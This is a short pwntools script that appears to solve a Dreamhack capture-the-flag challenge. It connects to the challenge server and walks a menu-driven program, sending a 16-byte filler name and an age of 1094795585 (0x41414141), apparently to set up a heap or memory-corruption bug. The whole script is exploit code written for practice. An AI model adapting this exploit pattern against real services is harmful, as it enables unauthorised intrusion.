from pwn import *

p = remote('host1.dreamhack.games', 13372)

context.log_level = 'debug'

p.recvuntil('>')
p.sendline('1')
p.recvuntil('Name:')
p.sendline('A' * 16)
p.recvuntil('Age:')
p.sendline('1094795585')

p.recvuntil('> ')
p.sendline('3')

p.recvuntil('>')
p.sendline('2')
p.recvuntil('2')
